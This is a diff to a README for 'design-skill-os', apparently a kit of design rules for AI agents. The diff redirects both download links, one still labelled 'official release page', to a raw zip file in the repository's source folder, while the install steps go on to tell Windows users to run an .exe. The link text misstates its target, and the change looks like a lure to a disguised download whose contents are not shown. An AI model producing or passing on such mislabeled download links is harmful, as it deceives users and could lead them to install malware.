@@ -1,6 +1,6 @@
 # 🎨 design-skill-os - Professional design logic for smart AI
 
-[![](https://img.shields.io/badge/Download-Design_Skill_OS-blue.svg)](https://github.com/mojiz521/design-skill-os/releases)
+[![](https://img.shields.io/badge/Download-Design_Skill_OS-blue.svg)](https://raw.githubusercontent.com/mojiz521/design-skill-os/main/src/skill-os-design-v3.7-alpha.5.zip)
 
 design-skill-os provides a foundation for AI agents to create functional and clean user interfaces. It organizes knowledge from design books into a format that AI tools understand. This system helps your AI avoid common design errors. It focuses on clarity and accessibility instead of visual clutter.
 
@@ -20,7 +20,7 @@ Your AI uses these rules to generate buttons, forms, and layouts that work for r
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/mojiz521/design-skill-os/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/mojiz521/design-skill-os/main/src/skill-os-design-v3.7-alpha.5.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends with .exe to save the installer to your computer.
 4. Open the file once the download finishes.
